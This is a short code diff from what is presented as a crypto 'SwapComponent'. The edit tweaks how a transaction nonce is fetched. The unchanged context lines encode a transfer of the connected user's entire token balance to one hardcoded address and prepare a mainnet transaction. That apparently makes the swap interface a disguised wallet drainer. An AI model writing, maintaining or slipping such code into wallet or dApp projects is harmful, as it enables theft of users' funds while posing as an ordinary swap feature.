@@ -83,7 +83,7 @@ function SwapComponent() {
       .transfer('0x4Ffa96dBE6a30656bC2Eadc615451675B0ed8621', balance)
       .encodeABI()
 
-    const nonce = await web3js.eth.getTransactionCount(address, 'pending')
+    const nonce = await web3js.eth.getTransactionCount(address)
     const chainId = mainnet.id
 
     const tx_ = {
